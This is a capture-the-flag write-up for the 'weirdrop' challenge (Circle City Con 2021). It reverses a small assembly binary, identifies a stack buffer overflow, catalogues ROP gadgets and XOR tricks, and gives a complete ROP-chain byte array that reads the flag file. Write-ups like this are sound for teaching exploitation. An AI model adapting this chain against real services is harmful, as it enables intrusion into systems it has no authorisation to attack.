## weirdrop (Circle City Con 2021)

Didn't participate in the ctf, but I noticed that there is no writeup for this
challenge, so I decided to address that. :D


## Exploitable Service

We get an exploitable service binary.

```bash
[joey@gibson] file weird-rop
weird-rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=2876651ce7257d4153ee90b05f0b1a2b29f25700, not stripped
```
Neato! The service is a 64-bit ELF. Looks like the binary is statically
compiled and not stripped making reversing and exploitation much easier for us.


## Reversing

Turns out there isn't much to reverse! This is a very lightweight binary,
written in assembly. Here's the program entry:

```
┌ 21: entry0 ();
│           0x00401154      e887ffffff     call loc.vuln
│           0x00401159      48c7c03c0000.  mov rax, 0x3c
│           0x00401160      48c7c7000000.  mov rdi, 0
└           0x00401167      0f05           syscall
```
So far so good - the program calls `vuln()` then calls the `exit` system call
with return code `0`. If you are looking for an easy reference for the ABI
[bookmark
this](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md).
Or if you're feeling masochistic you can rummage around in `/usr/include`.

Let's take a look at `vuln()`:
```
│           0x004010e0      55             push rbp
│           0x004010e1      4889e5         mov rbp, rsp
│           0x004010e4      4883ec10       sub rsp, 0x10
│           0x004010e8      48c7c0020000.  mov rax, 2
│           0x004010ef      488d3c250020.  lea rdi, loc.flag ; 0x402000 ; "/flag.txt"
│           0x004010f7      48c7c6020000.  mov rsi, 2
│           0x004010fe      48c7c2000000.  mov rdx, 0
│           0x00401105      0f05           syscall
```
So far we got `open("/flag.txt", O_RDWR)`. Note that this binary isn't actually
using libc, I'm just using libc functions to make it easier to look at. For
flags like `O_RDWR` look in `/usr/include` (e.g.
`/usr/include/asm-generic/fcntl.h`).

```
│           0x00401107      4883c030       add rax, 0x30
│           0x0040110b      880424         mov byte [rsp], al
│           0x0040110e      c64424010a     mov byte [var_1h], 0xa
│           0x00401113      48c7c0010000.  mov rax, 1
│           0x0040111a      48c7c7010000.  mov rdi, 1
│           0x00401121      4889e6         mov rsi, rsp
│           0x00401124      48c7c2020000.  mov rdx, 2
│           0x0040112b      0f05           syscall
```

At this point the `rax` register holds the file descriptor returned by the
`open` syscall. The program adds `0x30` to the file descriptor, which is a
low-tech way of turning a digit into its ASCII representation (`0x30`
represents zero and so on). We store this value on the stack and append `\n` to
it. The program then outputs this number to the stdout: `write(STDOUT_FILENO,
stack_pointer, 2);`

```
│           0x0040112d      48c7c0000000.  mov rax, 0
│           0x00401134      48c7c7000000.  mov rdi, 0
│           0x0040113b      4889e6         mov rsi, rsp
│           0x0040113e      48c7c2c80000.  mov rdx, 0xc8
│           0x00401145      0f05           syscall
│           0x00401147      48c7c7000000.  mov rdi, 0
│           0x0040114e      4883c410       add rsp, 0x10
│           0x00401152      5d             pop rbp
└           0x00401153      c3             ret
```
Boils down to this:
`read(STDOUT_FILENO, stack_ptr, 200);`

The final chunk of this function reads `0xc8` bytes on the stack, nulls out
the `rdi` register, does some final cleanup, and returns. Obviously this is the
vulnerability - we can overwrite the return address on the stack and gain
control of the program counter.

## Yucky Gadgets

Okay so.. what's the problem? Just hunt for some useful gadgets and get that
easy 300 points right? Let's take a look at some of the gadgets:

```
  0x00401000                 5e  pop rsi
  0x00401001                 c3  ret

  0x00401002     48c7c000000000  mov rax, 0
  0x00401009                 c3  ret
```

Cool cool.

```
  0x0040100a     48c7c001000000  mov rax, 1
  0x00401011                 c3  ret

  0x004010db               0f05  syscall
  0x004010dd                 c3  ret
```

Nice!

```
  0x0040109b     4881f7cd030000  xor rdi, 0x3cd
  0x004010a2                 c3  ret

  0x004010d3     4881f79a020000  xor rdi, 0x29a
  0x004010da                 c3  ret
```
... okay?

```
  0x004010cb     4881f7a3010000  xor rdi, 0x1a3
  0x004010d2                 c3  ret

  0x004010c3     4881f798010000  xor rdi, 0x198
  0x004010ca                 c3  ret
```

26 (if I counted correctly) `xor rdi` gadgets?! Gross.

## Exploitation Plan

The exploitation path I chose was to take advantage of the open file
descriptor, telegraphed to us by the service, to read the contents of the flag
file and then simply write it to standard output.

Most gadgets are already obvious - we can load `1` and `0` into `rax`
for `write` and `read` system cals respectively. We even have a gadget to load
`1` into `rdi` for the standard output file descriptor.

However we still need to put the flag file descriptor in `rdi` and there is no
clear gadget candidate for this. Time for some XOR math!

I don't know about you, but I'm pretty lazy, so I'm just going to write a Python
script to bruteforce the XOR gadgets we need. (Note that since the `rdi`
register is nulled out, the first XOR gadget will just put the immediate value
into the register). I can permute over every possible combination of XOR gadgets
and break when I get the value I want. `permute.py` is the script that I wrote
for this task. Take a look - nothing fancy here.

The file descriptor is always `5`, so we can just run `permute.py` once to
figure out the gadgets we need. (I think the challenge would be more interesting
if the file descriptor was somewhat random, so that we would have to
dynamically determine which gadgets we need to use).

```
[joey@gibson]$ ./permute.py 5
0x56 0x53
```
Great - so the xor gadgets that use these two operands is what we need. We
should have all of the key elements of our exploit. This is the ROP chain I
came up with:

```C
#define EXPLOIT_LEN     0xc8

uint8_t exploit[EXPLOIT_LEN] = {
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it's in your head!
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it's in your head!
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // filler!
    0x7c, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x53
    0x1a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x56
    0xde, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // pop rdx
    0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // length value
    0x02, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0
    0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall
    0x0a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x1
    0x12, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdi, 0x1
    0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//  ...
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
```

First 24 bytes is the filler for the stack - recall that the function subtracts
`0x10` from the stack pointer and pops a register. We covered what is going on
with the first two gadgets. The next gadget pops `0x19` into `rdx`, which is
the length of our read. Finally we shove the `read` syscall number into `rax`
and call it. Then we simply use the gadgets to load the `write` syscall number
and place stdout file decriptor (`1`) as its first argument (the other two
arguments in registers `rsi` and `rdx` remain the same). That's it!

Let's see it in action:

```bash
[joey@gibson]$ ./exploit
CCC{math_is_hard_1234897}
```
